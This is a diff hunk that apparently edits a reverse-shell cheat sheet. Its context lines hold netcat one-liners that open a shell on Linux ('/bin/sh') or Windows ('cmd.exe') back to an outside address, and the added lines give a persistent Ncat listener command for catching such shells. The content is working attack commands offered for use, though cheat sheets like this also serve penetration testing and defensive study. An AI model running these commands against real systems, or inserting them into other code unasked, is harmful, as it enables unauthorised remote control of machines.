@@ -207,6 +207,12 @@ nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell
 nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell
 ```
 
+Persistent Ncat listener:
+
+```bash
+ncat -lvk 443
+```
+
 # Python Reverse Shell
 
 ```python
